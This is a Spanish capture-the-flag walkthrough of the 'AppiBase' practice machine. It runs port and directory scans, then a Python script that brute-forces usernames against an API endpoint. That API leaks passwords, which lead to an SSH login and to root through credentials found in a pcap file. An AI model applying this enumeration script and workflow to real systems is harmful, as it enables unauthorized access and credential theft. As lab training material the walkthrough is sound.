- Tags: #AppiBAse
---
[Maquina AppiBase](https://mega.nz/file/KI0AFDYD#wAyZndNb3xIfY1C3y0Bpmlh4SthcZLyZd7iUyXnEMWs) -> Enlace de descarga al laboratorio

```bash
7z x apibase.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh apibase.tar # Desplegamos el laboratorio
```

### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion IP del target
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conexion con el target

wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

### Fase Enumeracion Puertos:
```bash
escanerTCP.py -t 172.17.0.2 -p 1-10000 # Usamos nuestra herramienta para la deteccion de puertos
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
nmap -sC -sV -p22,5000 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar los servicios y la versiones para estos puertos.
```

**( 22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u4 (protocol 2.0) )** -> Tenemos el servicio **ssh** expuesto
**( 5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.9.2) )** -> Tenemos este servicio web expuesto con python: **Werkzeug/1.0.1 Python/3.9.2**
**( Werkzeug )** -> Werkzeug es una **biblioteca en Python** que ofrece herramientas para el desarrollo de aplicaciones web compatibles con el estándar **WSGI (Web Server Gateway Interface).** En esencia, es una colección de utilidades que facilita la creación de aplicaciones web, incluso sin necesidad de un framework completo como Flask o Django

### Fase Enumeracion Web:
```bash
whatweb http://172.17.0.2:5000 # Nos reporta las tecnologias que usa este servicio
nmap --script http-enum -p 5000 172.17.0.2 # No reporta nada critico
```

```bash
gobuster dir -u http://172.17.0.2:5000/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,css,html,js,py,txt # Filtramos por extensiones

# Obtenemos dos rutas posibles
/add                  (Status: 405) [Size: 178]
/console              (Status: 400) [Size: 192]
```

**( http://172.17.0.2:5000/ )** -> Tendremos que interceptar la peticion para poder analizar esta **API**
**( Method Not Allowed )** -> El error **"Method Not Allowed"** en una API de Flask ocurre cuando intentas acceder a un endpoint utilizando un método HTTP no permitido (por ejemplo, GET cuando el endpoint solo acepta POST, o viceversa).

```bash
curl -X POST http://172.17.0.2:5000/add # Lanzamos una peticion por curl para ver como reacciona la web desde terminal,
```

```bash
curl -s -X POST http://172.17.0.2:5000/add \ # Intentamos crear un nuevo usuario.
-d "username=test" \
-d "email=test@test.com" \
-d "password=test123"

# Respuesta del servidor.
{
  "message": "User added"
}
```

```bash
curl -s X POST http://172.17.0.2:5000/users?username=test | jq # Verificamos la correcta creacion del usuario.

# Respuesta del servidor.
[
  [
    3,
    "test",
    "test123"
  ]
]
```

**Nota:** -> Creamos un script que aplique fuerza bruta para descubrir usuarios:

```python
#!/usr/bin/env python3

from termcolor import colored as c
import requests

API_URL = "http://172.17.0.2:5000/users"  # Endpoint de la API

def load_usernames(file_path):
    try:
        with open(file_path, 'r') as file:
            for line in file:
                yield line.strip()  # Generador para manejar listas grandes
    except FileNotFoundError:
        print(c(f"\n[-] Archivo no encontrado: {file_path}\n", "red"))
        return

def check_user(username):
    try:
        params = {"username": username}
        response = requests.get(API_URL, params=params, timeout=5)
        
        # Verificar si el usuario existe (depende de la respuesta de la API)
        if response.status_code == 200:
            if "Error: User not found" not in response.text:
                print(c(f"[+] Usuario válido encontrado: {username}", "green"))
                return True
        else:
            pass
            #print(c(f"[!] Error HTTP: {response.status_code}", "yellow"))
            
    except requests.exceptions.RequestException as e:
        print(c(f"[!] Error de conexión: {e}", "red"))
    return False

def main():
    file_path = "xato-net-10-million-usernames.txt"
    
    valid_users = 0
    try:
        for i, username in enumerate(load_usernames(file_path), 1):
            if check_user(username):
                valid_users += 1
                
            # Mostrar progreso cada 1000 intentos
            if i % 1000 == 0:
                print(c(f"\n[*] Progreso: {i} usuarios probados | Válidos: {valid_users}\n", "blue"))
                
    except KeyboardInterrupt:
        print(c("\n[!] Scaneo detenido por el usuario", "red"))
    
    print(c(f"\n[+] Total de usuarios válidos encontrados: {valid_users}\n", "green"))

if __name__ == '__main__':
    main()
```

```bash
[+] Usuario válido encontrado: pingu

curl -s X POST http://172.17.0.2:5000/users?username=pingu | jq # aplicamos esta peticion:

[
  [
    1,
    "pingu",
    "your_password"
  ],
  [
    2,
    "pingu",
    "pinguinasio"
  ]
]
```

### Fase Intrusion:
Ahora con estas credenciales nos intentaremso conectar por **ssh**
```bash
ssh-keygen -R 172.17.0.2 && ssh pingu@172.17.0.2 # Nos logueamos con esta password: ( pinguinasio )

```

### Fase Escalada Privilegios:
```bash
/home # En esta ruta tenemos archivos con credenciales de acceso.

cat network.pcap 
�ò����&�gVF((E(@"���P .�&�g@G((E(@O��P [�&�g�G((E(@"���P .�&�g3H33E3@"���P aRLOGIN root
&�g
   I66E6@"���P ��PASS balulero
&�g�I66E6@O��P ��Access Denied
```

```bash
su root # La contrasena es ( balulero )
```